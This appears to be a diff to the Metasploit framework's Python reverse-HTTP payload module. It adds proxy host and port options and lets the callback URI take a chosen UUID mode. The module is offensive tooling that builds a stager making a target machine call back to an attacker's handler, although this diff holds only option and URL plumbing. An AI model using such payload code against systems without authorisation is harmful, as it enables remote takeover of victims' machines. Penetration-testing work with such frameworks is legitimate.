@@ -9,6 +9,15 @@ module Payload::Python::ReverseHttp
 
   include Msf::Payload::UUID::Options
 
+  def initialize(info = {})
+    super(info)
+    register_options(
+      [
+        OptString.new('PayloadProxyHost', [ false, "The proxy server's IP address" ]),
+        OptPort.new('PayloadProxyPort', [ true, "The proxy port to connect to", 8080 ])
+      ], self.class)
+  end
+
   #
   # Generate the first stage
   #
@@ -39,15 +48,14 @@ module Payload::Python::ReverseHttp
 
     target_url << ':'
     target_url << opts[:port].to_s
-    target_url << '/'
-    target_url << generate_callback_uri
+    target_url << generate_callback_uri(opts)
     target_url
   end
 
   #
   # Return the longest URI that fits into our available space
   #
-  def generate_callback_uri
+  def generate_callback_uri(opts={})
     uri_req_len = 30 + rand(256-30)
 
     # Generate the short default URL if we don't have enough space
@@ -55,7 +63,7 @@ module Payload::Python::ReverseHttp
       uri_req_len = 5
     end
 
-    generate_uri_uuid_mode(:init_python, uri_req_len)
+    generate_uri_uuid_mode(opts[:uri_uuid_mode] || :init_python, uri_req_len)
   end
 
   def generate_reverse_http(opts={})
